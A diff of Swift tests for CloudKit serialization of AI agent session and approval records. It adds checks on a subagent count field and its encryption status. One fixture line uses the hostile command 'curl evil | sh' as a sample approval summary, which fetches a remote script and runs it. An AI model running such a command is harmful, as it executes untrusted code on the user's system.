@@ -77,6 +77,23 @@ private func answer(_ responses: [[String]] = [["Postgres"], ["A", "B"]]) -> Ans
         }
     }
 
+    @Test func sessionAgentCountRoundTripsAndDefaultsToZero() throws {
+        var value = session()
+        value.agentCount = 3
+        let record = CKRecord(from: value, zoneID: zone)
+        #expect(record["agentCount"] as? Int64 == 3)
+        #expect(SessionRecord(from: record) == value)
+        // A record from a Mac that predates subagents has no count: none running.
+        let old = CKRecord(from: session(), zoneID: zone)
+        old["agentCount"] = nil
+        #expect(SessionRecord(from: old)?.agentCount == 0)
+        // Present with the wrong type, or negative: not ours.
+        old["agentCount"] = "3" as NSString
+        #expect(SessionRecord(from: old) == nil)
+        old["agentCount"] = Int64(-1) as NSNumber
+        #expect(SessionRecord(from: old) == nil)
+    }
+
     @Test func approvalRecordRoundTrips() throws {
         for status in [ApprovalStatus.pending, .resolved, .expired] {
             for truncated in [false, true] {
@@ -157,7 +174,8 @@ private func answer(_ responses: [[String]] = [["Postgres"], ["A", "B"]]) -> Ans
         #expect(sessionRecord.encryptedValues["lastTool"] as? String == "Bash")
         #expect(sessionRecord["project"] == nil)
         #expect(sessionRecord["lastTool"] == nil)
-        #expect(plainKeys(sessionRecord) == ["sessionId", "state", "updatedAt"])
+        // `agentCount` is a bare number (how many subagents run), not sensitive.
+        #expect(plainKeys(sessionRecord) == ["sessionId", "state", "updatedAt", "agentCount"])
 
         let approvalRecord = CKRecord(from: approval(summary: "curl evil | sh"), zoneID: zone)
         #expect(approvalRecord.encryptedValues["tool"] as? String == "Bash")
